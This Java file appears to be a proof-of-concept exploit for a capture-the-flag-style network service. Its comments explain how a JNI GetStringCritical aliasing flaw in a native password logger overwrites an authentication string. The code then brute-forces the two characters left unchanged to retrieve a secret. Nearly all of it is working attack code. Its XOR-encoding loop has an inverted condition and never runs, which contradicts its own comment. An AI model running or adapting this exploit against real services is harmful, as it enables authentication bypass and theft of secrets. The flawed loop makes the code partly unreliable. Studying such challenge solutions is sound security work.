import java.io.*;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.net.Socket;
import java.nio.ByteBuffer;

public class POC {
    public static String server;

    public static byte[] joinByteArray(byte[] byte1, byte[] byte2) {
        return ByteBuffer.allocate(byte1.length + byte2.length)
                .put(byte1)
                .put(byte2)
                .array();

    }
    // ripped from the source, participants will need to do some light reversing to find the formatting for commands
    public static String sendCommand(byte[] command) {
        // System.out.println("[DEBUG] sending command");
        try {
            // Connect to the server
            Socket socket = new Socket(server, 1111);
            // Create input and output streams to read from and write to the server
            InputStream in = socket.getInputStream();
            OutputStream out = socket.getOutputStream();
            // use a const xor pattern as some light obscuration
            for (int i = 0; i > command.length; i++) {
                command[i] = (byte) (command[i] ^ 12);
            }
            //send
            out.write(command);
            out.flush();
            //response
            byte[] response = new byte[256];
            in.read(response);
            String response_str = new String(response);
            // System.out.println(response_str);
            // Close our socket
            socket.close();
            return response_str;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return "ERROR SENDING";
    }                                                 

    public static void main(String[] args) {
        if (args.length < 1) {
            System.out.println("Usage: ClientExample <server>");
            System.exit(0);
        }
        server = args[0];


        byte[] command_type_provision = {0x17};
        byte[] command_type_login = {0x38};
        byte[] command_type_secret = {0x4a};
        String r = "";


        System.out.println("Running POC...");
        System.out.println("Connecting to: " + server);

        // create a new account with _any_ non Latin1 encodable character in the username. 
        // This ensures the auth string is backed by a UTF-16 buffer
        System.out.println("Requesting new account...");
        byte[] command = joinByteArray(command_type_provision,"⨪".getBytes());
        r = sendCommand(command);
        System.out.println(r);
        try{ Thread.sleep(1000) ; } catch (Exception e){}



        // try to auth with any account. this causes the password log function to be called
        // because the auth string is allready UTF-16 and not Latin1, the hotspot JNI will 
        // pass a pointer direclty to the java heap instead of making a copy
        //      (see ~line 2823 in https://github.com/openjdk/jdk/blob/master/src/hotspot/share/prims/jni.cpp for the implementation of jni_GetStringCritical )
        // the native password log function assumes it has a copy, and will place '*' in every byte before printing
        // this replaces the entire string backing buffer with the UTF-16 unicode characer made from two '*' ascii character bytes, '⨪'
        System.out.println("Random login attempt...");
        command = joinByteArray(command_type_login,"a:a".getBytes());
        r = sendCommand(command);
        System.out.println(r);
        try{ Thread.sleep(1000) ; } catch (Exception e){}
        // we made the string have one char for username, one char is the ":" character, and the random password is 
        // 64 characters, so we need 66 characters in our auth string. 
        // there is some bad math in the loop of the native function, so two characters of the auth string DONT get overwriten.
        // just guess those in a loop
        // byte[] t = "⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪".getBytes();
        String t = "⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪⨪";
        // String crib = "ASDFGHJKLQWERTYUIOPZXCVBNM[\\]^_`asdfghjklzxcvbnmqwertyuiop";
        System.out.println("Going into loop....");
        for(int i = 'A'; i<='z';i++){
            for(int j = 'A'; j<='z';j++){
                try{ Thread.sleep(10) ; } catch (Exception e){}
                String authstr = t.concat(String.valueOf((char)i)).concat(String.valueOf((char)j));
                command = joinByteArray(command_type_secret, authstr.getBytes());
                r = sendCommand(command);
                r = r.replace("\0", ""); 
                if(!r.equals("Bad creds")){
                    System.out.println(r);
                    return;
                }       
            }
        }

    }
}